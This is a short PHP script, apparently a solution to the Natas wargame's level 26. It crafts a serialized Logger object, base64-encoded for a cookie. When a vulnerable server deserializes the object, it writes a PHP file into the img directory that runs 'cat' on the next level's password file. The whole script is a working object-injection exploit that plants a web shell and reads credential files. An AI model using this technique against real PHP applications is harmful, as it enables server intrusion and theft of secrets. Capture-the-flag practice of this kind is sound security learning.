<?php 

    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct($file){
            // initialise variables
            $this->initMsg="<?php passthru('cat /etc/natas_webpass/natas27'); ?>";  // this php code will be written to log file
            $this->exitMsg="<?php passthru('cat /etc/natas_webpass/natas27'); ?>";
            $this->logFile = "img/haha.php";         // create own log file in /img directory which we ll be able to access later
      
            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$initMsg);       // write the php code
            fclose($fd);
        }                       
      
        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }                       
      
        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);         // write the php code
            fclose($fd);
        }                       
    }
    $object = new logger('huhu');           // make a logger object
    echo base64_encode(serialize($object));     // serialize and abse64 encode the object to send it as a cookie

    // the object is deserialed in the serevr a logger object will be craeted and the magic __ functions() will execute

?>